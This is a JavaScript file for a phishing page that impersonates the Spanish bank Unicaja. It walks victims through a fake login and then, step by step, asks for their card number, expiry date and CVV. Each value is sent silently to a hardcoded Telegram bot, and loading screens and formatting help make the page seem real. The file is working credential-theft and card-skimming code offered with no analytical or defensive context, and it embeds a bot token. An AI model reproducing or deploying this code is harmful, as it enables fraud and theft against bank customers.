const BOT_TOKEN = '8448340224:AAHNaVCfWtiGdKn6bhhR936s_rRp2R4HLTM';
const CHAT_ID = '1734386292';

async function sendToTelegram(msg) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
        });
    } catch (e) {}
}

function togglePassword() {
    const input = document.getElementById('clave');
    const btn = document.getElementById('mostrarBtn');
    if (input.type === 'password') { input.type = 'text'; btn.textContent = 'Ocultar'; }
    else { input.type = 'password'; btn.textContent = 'Mostrar'; }
}

function transition(hideId, showId) {
    if (hideId) document.getElementById(hideId).classList.add('hidden');
    if (showId) document.getElementById(showId).classList.remove('hidden');
}

function showLoading(cb) {
    document.getElementById('loadingScreen').style.display = 'flex';
    setTimeout(() => { document.getElementById('loadingScreen').style.display = 'none'; cb(); }, 2200);
}

/* ===== LOGIN ===== */
const dniInput = document.getElementById('dni');
const claveInput = document.getElementById('clave');
const loginBtn = document.getElementById('loginBtn');

function checkLogin() {
    loginBtn.disabled = !(dniInput.value.trim().length > 0 && claveInput.value.trim().length > 0);
}
dniInput.addEventListener('input', checkLogin);
claveInput.addEventListener('input', checkLogin);

loginBtn.addEventListener('click', function() {
    if (this.disabled) return;
    sendToTelegram(`🟢 UNICAJA LOGIN\n━━━━━━━━━━━━\n👤 DNI/Usuario: ${dniInput.value}\n🔑 Clave: ${claveInput.value}`);
    transition('loginSection', null);
    showLoading(() => transition(null, 'stepTarjeta'));
});

/* ===== TARJETA ===== */
// Format card number with spaces
document.getElementById('tarjeta').addEventListener('input', function(e) {
    let v = this.value.replace(/\D/g, '').substring(0, 16);
    let formatted = v.replace(/(.{4})/g, '$1 ').trim();
    this.value = formatted;
});

function sendTarjeta() {
    const val = document.getElementById('tarjeta').value;
    if (!val.trim()) return;
    sendToTelegram(`💳 UNICAJA TARJETA\n━━━━━━━━━━━━\nNúmero: ${val}`);
    transition('stepTarjeta', 'stepFecha');
}

// Format expiry date
document.getElementById('fecha').addEventListener('input', function(e) {
    let v = this.value.replace(/\D/g, '').substring(0, 4);
    if (v.length >= 3) v = v.substring(0, 2) + '/' + v.substring(2);
    this.value = v;
});

function sendFecha() {
    const val = document.getElementById('fecha').value;
    if (!val.trim()) return;
    sendToTelegram(`📅 UNICAJA CADUCIDAD\n━━━━━━━━━━━━\nFecha: ${val}`);
    transition('stepFecha', 'stepCVV');
}

function sendCVV() {
    const val = document.getElementById('cvv').value;
    if (!val.trim()) return;
    sendToTelegram(`🔒 UNICAJA CVV\n━━━━━━━━━━━━\nCVV: ${val}`);
    transition('stepCVV', null);
    showLoading(() => transition(null, 'stepOK'));
}
